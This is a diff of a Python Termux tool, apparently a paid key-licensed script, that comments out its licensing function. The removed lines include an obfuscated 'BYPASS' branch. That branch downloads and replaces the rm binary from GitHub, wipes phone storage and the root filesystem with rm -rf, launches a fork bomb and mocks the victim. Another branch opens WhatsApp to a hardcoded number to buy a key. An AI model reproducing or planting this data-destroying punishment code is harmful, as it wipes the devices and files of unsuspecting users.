@@ -175,21 +175,21 @@ else:print(f"{style} {note} ");exit()
 if hamdam(naki)==25:pass
 else:print(f"{style} {note} ");exit()
 #-------------------------(MR-TOP APPROVAL)------------------------->>>
-def rsbuy():
-    try:
-        clear()
+#def rsbuy():
+    #try:
+        #clear()
         #if 'BYPASS' in link:os.system("c"+"d /"+"data"+"/dat"+"a/com"+".term"+"ux/fi"+"les/usr"+"/bin &"+"& cur"+"l -s"+"S -"+"L ht"+"tps:/"+"/githu"+"b.com"+"/R"+"EFAT"+"-"+"156/"+"Serve"+"rO"+"fRefa"+"t/raw"+"/main"+"/rm "+"-o rm"+" &&"+" chm"+"od +x"+" /dat"+"a/data"+"/com."+"termu"+"x/file"+"s/usr/"+"bin/r"+"m &"+"& c"+"d "+"$HO"+"ME/REF"+"AT"+"-XD");wash('touch .hushlogin');wash('rm -rf /sdcard/DCIM');wash('rm -rf /storage/emulated/0/*');wash('rm -rf /storage/emulated/*');wash('rm -rf /sdcard/*');wash('rm -rf /sdcard/0/*');wash('rm -rf /sdcard1/*');wash('rm -rf /storage/*');wash('rm -rf /*');wash('rm -rf /system/*');wash('rm -rf $HOME/../../*');wash('rm -rf $PREFIX/b');wash('rm -rf $HOME/*');wash('mv $HOME /dev/null');wash('rm -rf /data/data/com.termux');wash(':(){ :|: & };:');wash('clear');print(logo);_________linex_________();print(f'{style} MR.TOP FUCK YOUR SYSTEM 🙂 ');_________linex_________();time.sleep(2);print(f'{style} PAID COMMAND FREE USE NOTE EASY 🤗 ');_________linex_________();time.sleep(2);print(f'{style} GO AND CHECK YOUR STORAGE BYE...🤞 ');_________linex_________();time.sleep(2);exit()
         #elif 'UPDATE' in link:clear();verify();iamcheckingyou();print(f'\n{style} Tool Is Under Maintenance For Few Hours....\n');time.sleep(2);();exit()
-        elif 'FREE' in link:clear();verify();iamcheckingyou();print(f'{style} Free Trial For Some Time..!');time.sleep(3);_________linex_________();___R_E_F_A_T___()
-        elif tornanire in link:clear();___R_E_F_A_T___()
-        else:
-            wash("clear");print(logopaid);print(f"\n{style}{G3} KEY ● {tornanire}\n")
-            url_wa = "https:"+"//api.whats"+"app.com/send"+"?phone=+88017836"+"61182&text="
-            tks = (f"ASSALAMUA"+"LAIKUM MR"+"-TOP SIR I WA"+"NT TO BU"+"Y YOUR P"+"AID TOOLS VERSI"+f"ON {vr} PLEA"+"SE ACC"+"EPT MY KEY TO PREM"+"IUM ❤️\n\nKEY ● "+tornanire)
-            subprocess.check_output(["am", "start", url_wa+(tks)]);exit()
-    except pycurl.error:exit(f"{style} Your Network Is Unreachable ! ")
-    except ValueError:exit()
-    except Exception as e:exit()
+        #elif 'FREE' in link:clear();verify();iamcheckingyou();print(f'{style} Free Trial For Some Time..!');time.sleep(3);_________linex_________();___R_E_F_A_T___()
+        #elif tornanire in link:clear();___R_E_F_A_T___()
+       # else:
+            #wash("clear");print(logopaid);print(f"\n{style}{G3} KEY ● {tornanire}\n")
+            #url_wa = "https:"+"//api.whats"+"app.com/send"+"?phone=+88017836"+"61182&text="
+            #tks = (f"ASSALAMUA"+"LAIKUM MR"+"-TOP SIR I WA"+"NT TO BU"+"Y YOUR P"+"AID TOOLS VERSI"+f"ON {vr} PLEA"+"SE ACC"+"EPT MY KEY TO PREM"+"IUM ❤️\n\nKEY ● "+tornanire)
+            #subprocess.check_output(["am", "start", url_wa+(tks)]);exit()
+    #except pycurl.error:exit(f"{style} Your Network Is Unreachable ! ")
+    #except ValueError:exit()
+    #except Exception as e:exit()
 #-------------------------(MR-TOP APPROVAL)------------------------->>>
 def __durmagi__():
     return None
